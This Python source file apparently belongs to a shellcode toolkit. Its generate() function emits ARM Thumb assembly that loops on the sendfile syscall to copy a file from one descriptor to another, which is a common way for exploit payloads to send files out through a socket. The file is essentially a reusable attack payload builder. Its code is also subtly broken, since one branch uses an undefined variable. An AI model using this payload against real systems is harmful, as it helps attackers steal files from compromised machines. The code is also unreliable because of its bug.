# send a file

def generate(in_fd, out_fd):
    """sends a file to user in thumb mode

    Args: 
        in_fd  (str/int): in file descriptor
        out_fd (str/int): out file descriptor
    """

    sc = ''
    sc += """
    subs r4, r4, r4
loop_1:
    """
    try:
        xin_fd = int(in_fd)
        sc += 'movs r1, #%s\n' % (xin_fd)
    except:
        sc += 'mov r1, %s\n' % (in_fd)

    try:
        xout_fd = int(out_fd)
        sc += 'movs r0, #%s\n' % (xout_fd)
    except:
        sc += 'mov r0, %s\n' % (xout_fd)

    sc += """
    subs r2, r2, r2
    movs r3, #255
    movs r7, #187
    svc 1
    """

    sc += """
    cmp r0, r4
    bgt loop_1
    """

    return sc
